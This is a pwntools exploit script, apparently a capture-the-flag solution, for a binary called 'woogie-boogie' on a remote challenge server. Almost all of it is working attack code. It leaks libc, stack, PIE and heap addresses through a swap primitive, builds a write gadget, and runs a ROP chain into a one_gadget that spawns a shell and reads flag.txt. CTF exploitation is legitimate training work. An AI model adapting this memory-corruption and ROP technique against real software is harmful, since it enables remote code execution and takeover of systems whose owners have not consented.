#!/usr/bin/env python
from pwn import *

GDB_OFF = 0x555555554000
IP = 'chall.lac.tf'
PORT = 31166
BINARY = './woogie-boogie'
ARGS = []
ENV = {}
CALL_SWAP = 0x13b0
RET = 0x147f
RET_SWAP = 0x12f4
ATOL_DONE = 0x1266

GDB = f"""
set follow-fork-mode parent

# b * {GDB_OFF + ATOL_DONE}
# b * {GDB_OFF + CALL_SWAP}
# b swap
b * swap+61
# b * {GDB_OFF + RET_SWAP}
# b * {GDB_OFF + RET}
# b atol

c"""

context.arch = 'amd64'

if not args.REMOTE:
  context.binary = exe = ELF(BINARY, checksec=False)
  libc = ELF('./libc.so.6', checksec=False)

context.aslr = False

byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
phex = lambda x, y='': print(y + hex(x))
lhex = lambda x, y='': log.info(y + hex(x))
pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(s, v) if o == 'r' else byt(x).rjust(s, v)
padhex = lambda x, s: pad(hex(x)[2:], s, '0', 'l')
upad = lambda x: u64(pad(x))

t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None: gt(t).sendline(byt(x))
se = lambda x, t=None: gt(t).send(byt(x))
sla = lambda x, y, t=None: gt(t).sendlineafter(byt(x), byt(y))
sa = lambda x, y, t=None: gt(t).sendafter(byt(x), byt(y))
ra = lambda t=None: gt(t).recvall()
rl = lambda t=None: gt(t).recvline()
re = lambda x, t=None: gt(t).recv(x)
ru = lambda x, t=None: gt(t).recvuntil(byt(x))
it = lambda t=None: gt(t).interactive()
cl = lambda t=None: gt(t).close()

linfo = lambda x: log.info(x)

vm = None
def get_target(**kw):
    global vm

    if args.REMOTE:
        # context.log_level = 'debug'
        return remote(IP, PORT)

    from vagd import Dogd, Qegd, Vagd, Shgd, Box # only load vagd if needed
    if not vm:
        vm = Dogd(exe.path, image=Box.DOCKER_FOCAL, ex=True, fast=True)  # Docker
        # vm = Qegd(exe.path, img=Box.QEMU_FOCAL, ex=True, fast=True)  # Qemu
        # vm = Vagd(exe.path, vbox=Box.VAGRANT_JAMMY64, ex=True, fast=True)  # Vagrant
        # vm = Shgd(exe.path, user='user', host='localhost', port=22, ex=True, fast=True)  # SSH
    if vm.is_new:
        linfo("new vagd instance") # additional setup here
    return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)

BASE = 0

def base_diff(a, base=None):
  if base is None:
    base = BASE
  diff = a - base
  assert diff % 8 == 0, "unaligned diff"
  return diff // 8
  

def woogie_boogie(a, b):
  sla("woogie: ", a)
  sla("boogie: ", b)

def leaker():
  woogie_boogie(0, 0)
  return rl()[:-1]


t = get_target()

# leak libc
BASE = 0x7fffffffed10
START_REF = base_diff(0x7fffffffede8)
ROP = base_diff(0x7fffffffed38)

woogie_boogie(0, START_REF)
woogie_boogie(0, ROP)
leak = u64(leaker(), endian='big')
LIBC = leak - 0x24083
if not args.REMOTE:
  libc.address = LIBC
lhex(LIBC, "libc: ")

# leak stack
STACK_LEAK = base_diff(0x7fffffffec68, 0x7fffffffec30)

woogie_boogie(START_REF, ROP)
woogie_boogie(0, STACK_LEAK)
leak = u64(leaker(), endian='big')
STACK = leak
lhex(STACK, "stack: ") # 0x7fffffffed48

# leak PIE
MAIN = base_diff(0x7fffffffeb98, 0x7fffffffeb50)

woogie_boogie(START_REF, ROP)
woogie_boogie(0, MAIN)
leak = u64(leaker(), endian='big')
PIE = leak - 0x12f5 # exe.sym.main
if not args.REMOTE:
  exe.address = PIE
lhex(PIE, "pie: ")

# leak heap
HEAP_LEAK = base_diff(LIBC+0x1ec2c8, STACK-0x2d8)

woogie_boogie(START_REF, ROP)
woogie_boogie(0, HEAP_LEAK)
leak = u64(leaker(), endian='big')
HEAP = leak
lhex(HEAP, "heap: ")


# allocate (c 8)
BASE = 0x7fffffffe530

SWAP_ROP = base_diff(0x7fffffffe518)
A_STACK = base_diff(0x7fffffffe508) 
B_STACK = base_diff(0x7fffffffe500)
WOOGIE_STACK = base_diff(0x7fffffffe538)
BOOGIE_STACK = base_diff(0x7fffffffe540)

PAD = 0xe0
BASE = STACK - 0x3b8 # 0x7fffffffe990

def create_char(char):
  assert char < 0x100, "char to large"
  woogie_boogie(char, WOOGIE_STACK)
  woogie_boogie(0, char)

linfo("allocate")
ALLOCS = 5 
for i in range(ALLOCS):
  print(f'{i}/{ALLOCS}', end='\r')
  woogie_boogie(START_REF, ROP)
  woogie_boogie(0, 0)
  BASE -= PAD

# RCE (c 13)
linfo("woogie boogie")
lhex(BASE, 'base: ')

DONOR = base_diff(0x7fffffffe318, 0x7fffffffe370)
READ_THIS = PIE + 0x1248
READ_END = PIE + 0x1280

char = READ_THIS & 0xff
ptr = BASE^char
up = base_diff(ptr)
lhex(ptr, "up: ")
woogie_boogie(up, DONOR) 
create_char(char)
woogie_boogie(B_STACK, 0)

linfo("create WRITE gadget")
# c 17
# can be shortend but easiert to explain like this
xor = char ^ (READ_END & 0xff) ^ (READ_THIS & 0xff)
xor_ptr = BASE^xor 
xor_up = base_diff(xor_ptr)
woogie_boogie(xor_up, up) 
create_char(xor)
woogie_boogie(B_STACK, 0)

# c 21
linfo("start ROP")
woogie_boogie(SWAP_ROP, xor_up)

rce = flat(
  LIBC + 0xce383, #clear rdx
  LIBC + 0xe3b01 # one_gadget
)

linfo("spawn shell")
sl(rce)

if args.REMOTE:
  sleep(1)
linfo("get flag")
sl("echo PWN")
sla("PWN", "cat flag.txt")

it() # or t.interactive()
